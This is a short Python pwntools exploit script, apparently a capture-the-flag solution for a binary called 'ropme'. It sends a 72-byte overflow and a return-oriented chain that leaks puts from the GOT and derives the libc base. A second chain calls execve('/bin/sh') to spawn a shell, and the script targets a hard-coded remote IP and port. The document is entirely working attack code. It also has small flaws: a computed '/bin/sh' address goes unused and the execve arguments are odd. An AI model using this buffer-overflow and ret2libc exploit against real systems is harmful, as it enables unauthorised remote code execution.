#!/bin/env python3
from pwn import *

elf = context.binary = ELF('./ropme_patched')

if args.REMOTE:
    libc = ELF('./libc.so.6',  checksec=False)
    p = remote('64.227.39.88', 32705)
else:
    libc = elf.libc
    p = elf.process()

rop = ROP(elf)

rop.raw('A' * 72)
rop.puts(elf.got['puts'])
rop.raw(elf.symbols['main'])

p.sendline(rop.chain())

p.recvline()
puts = u64(p.recv(6) + b'\x00\x00')
log.success(f'leaked puts: {hex(puts)}')

libc.address = puts - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

binsh = next(libc.search(b'/bin/sh\x00'))
rop = ROP(libc)
rop.raw('A' * 72)
rop.execve('/bin/sh', 1, 1)

p.sendline(rop.chain())

#p.interactive()

